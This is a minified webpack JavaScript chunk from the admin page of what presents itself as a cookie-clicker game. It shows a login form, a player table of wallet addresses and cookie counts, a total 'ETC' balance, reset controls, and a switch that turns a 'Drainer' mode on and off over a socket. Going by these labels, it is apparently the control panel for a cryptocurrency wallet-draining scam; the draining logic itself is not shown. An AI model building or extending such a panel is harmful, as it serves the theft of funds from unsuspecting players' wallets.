(self.webpackChunkcookier_clicker_frontend=self.webpackChunkcookier_clicker_frontend||[]).push([[804],{8438:function(e,s,n){"use strict";n.r(s),n.d(s,{default:function(){return m}});var a=n(1413),t=n(9439),i=n(2791),c=n(8174),o=n(2860),l=n(184);function r(e){var s=e.players,n=(0,i.useState)(0),a=(0,t.Z)(n,2),c=a[0],r=a[1],d=function(){r((0,o.Z)("currentpageNum"))},m=function(){r((0,o.Z)("currentpageNum"))};return(0,l.jsxs)("div",{className:"m-table",children:[(0,l.jsx)("div",{className:"m-table-header",children:(0,l.jsxs)("div",{className:"m-table-row",children:[(0,l.jsx)("div",{className:"m-table-cell w-1",children:"#"}),(0,l.jsx)("div",{className:"m-table-cell w-2",children:"address"}),(0,l.jsx)("div",{className:"m-table-cell w-2",children:"cookies"}),(0,l.jsx)("div",{className:"m-table-cell w-1",children:"clicks/1m"}),(0,l.jsx)("div",{className:"m-table-cell w-2",children:"status"})]})}),(0,l.jsx)("div",{className:"m-table-body",children:s.map((function(e,s){return(0,l.jsxs)("div",{className:"m-table-row",children:[(0,l.jsx)("div",{className:"m-table-cell w-1",children:s+1+10*c}),(0,l.jsx)("div",{className:"m-table-cell w-2",children:(0,l.jsxs)("div",{className:"tooltip",style:{color:"green",cursor:"copy"},onCopy:function(){},children:[e.address.substring(0,4)+"..."+e.address.substring(e.address.length-4,e.address.length),(0,l.jsx)("span",{className:"tooltiptext",children:e.address})]})}),(0,l.jsx)("div",{className:"m-table-cell w-2",children:e.cookies}),(0,l.jsx)("div",{className:"m-table-cell w-1",children:e.aminclickes}),(0,l.jsx)("div",{className:"m-table-cell w-2",children:(0,l.jsxs)("label",{className:"switch",children:[(0,l.jsx)("input",{type:"checkbox",checked:e.status,onChange:function(){return s=e.address,void document.socket.emit("set-status",s);var s}}),(0,l.jsx)("span",{className:"slider round"})]})})]},s)}))}),(0,l.jsx)("div",{className:"m-table-body",children:function(){var e=s.length/10,n=[];return n.push((0,l.jsx)("button",{disabled:0===c,onClick:d,children:"<"},0)),n.push((0,l.jsx)("button",{disabled:!0,children:c+1},1)),n.push((0,l.jsx)("button",{disabled:c>=Math.floor(e),onClick:m,children:">"},2)),n}()})]})}var d=n.p+"static/media/avatar.fe810a6b4d09d4cd13a6f82bcb7c7697.svg";n(3665);function m(){var e=(0,i.useState)(!1),s=(0,t.Z)(e,2),n=s[0],o=s[1],m=(0,i.useState)({players:[],realTime:0,totalBalance:0,draidner:!1}),h=(0,t.Z)(m,2),u=h[0],x=h[1],j=(0,i.useState)({_username:"",_password:""}),v=(0,t.Z)(j,2),p=v[0],C=v[1],k=(0,i.useState)(0),f=(0,t.Z)(k,2),g=(f[0],f[1],(0,i.useState)(0)),w=(0,t.Z)(g,2),N=(w[0],w[1],(0,i.useState)(!1)),b=(0,t.Z)(N,2),F=b[0],y=b[1],M=function(e){p[e.target.name]=e.target.value,C((0,a.Z)({},p))};return(0,i.useEffect)((function(){document.adminSocket.onLogin=function(e){e.success?(c.Am.info((0,l.jsx)("div",{className:"toast-content",children:"welcome!!"})),o(!0)):c.Am.error((0,l.jsx)("div",{className:"toast-content",children:e.message}))},document.adminSocket.onMonitorDate=function(e){x({players:e.players,realTime:e.realTime,totalBalance:e.totalBalance,draidner:e.drainer})},document.adminSocket.onReset=function(e){c.Am.info((0,l.jsx)("div",{className:"toast-content",children:e.message})),setTimeout((function(){y(!1)}),500)},document.adminSocket.onDraidner=function(e){c.Am.info((0,l.jsx)("div",{className:"toast-content",children:e?"Drainer Enabled":"Drainer Disabled"}))},document.title="$COOKIE ADMIN"}),[]),n?(0,l.jsxs)("div",{className:"amdin-page",children:[(0,l.jsx)(c.Ix,{position:"bottom-right",autoClose:3e3}),(0,l.jsxs)("div",{className:"header",children:[(0,l.jsx)("div",{className:"monitor-title",children:"$COOKIE MONITOR"}),(0,l.jsxs)("div",{className:"",children:[(0,l.jsx)("div",{className:"avatar",children:(0,l.jsx)("img",{src:d})}),(0,l.jsx)("div",{children:(0,l.jsxs)("label",{className:"switch",children:[(0,l.jsx)("input",{type:"checkbox",checked:u.draidner,onChange:function(){document.socket.emit("req-drainer-mode")}}),(0,l.jsx)("span",{className:"slider round"})]})})]})]}),(0,l.jsxs)("div",{className:"boday",children:[(0,l.jsxs)("div",{className:"m-card-group",children:[(0,l.jsx)("div",{className:"m-card",children:(0,l.jsxs)("div",{className:"m-card-body",children:[(0,l.jsx)("svg",{width:"70px",height:"70px",viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,l.jsx)("path",{d:"M5 21C5 17.134 8.13401 14 12 14C15.866 14 19 17.134 19 21M16 7C16 9.20914 14.2091 11 12 11C9.79086 11 8 9.20914 8 7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7Z",stroke:"#FFFFFF",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})}),(0,l.jsx)("div",{className:"title",children:u.players.length})]})}),(0,l.jsx)("div",{className:"m-card",children:(0,l.jsxs)("div",{className:"m-card-body",children:[(0,l.jsxs)("svg",{width:"70px",height:"70px",viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,l.jsx)("path",{d:"M12 6.5C12 6.26077 12 6.14115 12.0807 6.06687C12.1615 5.99259 12.2741 6.002 12.4994 6.02082C13.3784 6.09424 14.2326 6.36078 15 6.80385C15.9121 7.33046 16.6695 8.08788 17.1962 9C17.7228 9.91212 18 10.9468 18 12C18 13.0532 17.7228 14.0879 17.1962 15C16.6695 15.9121 15.9121 16.6695 15 17.1962C14.0879 17.7228 13.0532 18 12 18C10.9468 18 9.91211 17.7228 9 17.1962C8.23258 16.7531 7.57467 16.1466 7.07159 15.4221C6.94265 15.2364 6.87817 15.1435 6.90213 15.0365C6.92608 14.9294 7.02968 14.8696 7.23686 14.75L11.75 12.1443C11.872 12.0739 11.933 12.0387 11.9665 11.9807C12 11.9226 12 11.8522 12 11.7113V6.5Z",fill:"#FFFFFF"}),(0,l.jsx)("circle",{cx:"12",cy:"12",r:"9",stroke:"#FFFFFF",strokeWidth:"2"})]}),(0,l.jsx)("div",{className:"title",children:u.realTime})]})}),(0,l.jsx)("div",{className:"m-card",children:(0,l.jsxs)("div",{className:"m-card-body",children:[(0,l.jsx)("svg",{width:"70px",height:"70px",viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,l.jsx)("path",{d:"M14 14H17M14 10H17M9 9.5V8.5M9 9.5H11.0001M9 9.5C7.20116 9.49996 7.00185 9.93222 7.0001 10.8325C6.99834 11.7328 7.00009 12 9.00009 12C11.0001 12 11.0001 12.2055 11.0001 13.1667C11.0001 13.889 11.0001 14.5 9.00009 14.5M9.00009 14.5L9 15.5M9.00009 14.5H7.0001M6.2 19H17.8C18.9201 19 19.4802 19 19.908 18.782C20.2843 18.5903 20.5903 18.2843 20.782 17.908C21 17.4802 21 16.9201 21 15.8V8.2C21 7.0799 21 6.51984 20.782 6.09202C20.5903 5.71569 20.2843 5.40973 19.908 5.21799C19.4802 5 18.9201 5 17.8 5H6.2C5.0799 5 4.51984 5 4.09202 5.21799C3.71569 5.40973 3.40973 5.71569 3.21799 6.09202C3 6.51984 3 7.07989 3 8.2V15.8C3 16.9201 3 17.4802 3.21799 17.908C3.40973 18.2843 3.71569 18.5903 4.09202 18.782C4.51984 19 5.07989 19 6.2 19Z",stroke:"#FFFFFF",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})}),(0,l.jsxs)("div",{className:"title",children:["ETC",u.totalBalance]})]})})]}),(0,l.jsx)("div",{className:"monitor-wrap",children:(0,l.jsx)(r,{players:u.players})})]}),(0,l.jsx)("div",{className:"footer",style:{flexDirection:"row",display:"flex",justifyContent:"center"},children:(0,l.jsxs)("div",{className:"rescet-btn",onClick:function(){y(!0),document.socket.emit("all-reset")},children:[(0,l.jsx)("svg",{width:"35px",height:"35px",viewBox:"0 0 21 21",xmlns:"http://www.w3.org/2000/svg",className:F?"resetloding":"",children:(0,l.jsxs)("g",{fill:"none",fillRule:"evenodd",stroke:"#FFFFFF",strokeLinecap:"round",strokeLinejoin:"round",transform:"matrix(0 1 1 0 2.5 2.5)",children:[(0,l.jsx)("path",{d:"m3.98652376 1.07807068c-2.38377179 1.38514556-3.98652376 3.96636605-3.98652376 6.92192932 0 4.418278 3.581722 8 8 8s8-3.581722 8-8-3.581722-8-8-8"}),(0,l.jsx)("path",{d:"m4 1v4h-4",transform:"matrix(1 0 0 -1 0 6)"})]})}),"RESET"]})})]}):(0,l.jsx)("div",{className:"login-page",children:(0,l.jsx)("div",{className:"login-card",children:(0,l.jsxs)("div",{className:"login-form",children:[(0,l.jsxs)("svg",{viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,l.jsx)("circle",{opacity:"0.5",cx:"12",cy:"9",r:"3",stroke:"#1C274C",strokeWidth:"1.5"}),(0,l.jsx)("circle",{cx:"12",cy:"12",r:"10",stroke:"#1C274C",strokeWidth:"1.5"}),(0,l.jsx)("path",{opacity:"0.5",d:"M17.9691 20C17.81 17.1085 16.9247 15 11.9999 15C7.07521 15 6.18991 17.1085 6.03076 20",stroke:"#1C274C",strokeWidth:"1.5",strokeLinecap:"round"})]}),(0,l.jsx)("input",{type:"text",value:p.username,name:"_username",placeholder:"Username",onChange:M}),(0,l.jsx)("input",{type:"password",value:p.password,name:"_password",placeholder:"Password",onChange:M}),(0,l.jsx)("button",{onClick:function(){document.socket.emit("admin-login",{username:p._username,password:p._password})},children:"LOGIN"})]})})})}document.adminSocket={onLogin:function(e){console.log(e)},onMonitorDate:function(e){console.log(e)},onReset:function(e){console.log(e)},onDraidner:function(e){console.log(e)}},document.socket.on("admin-login",(function(e){document.adminSocket.onLogin(e)})),document.socket.on("player-monitor",(function(e){document.adminSocket.onMonitorDate(e)})),document.socket.on("on-allReset",(function(e){document.adminSocket.onReset(e)})),document.socket.on("res-drainer-mode",(function(e){document.adminSocket.onDraidner(e)}))},4654:function(){}}]);
//# sourceMappingURL=804.6aba9140.chunk.js.map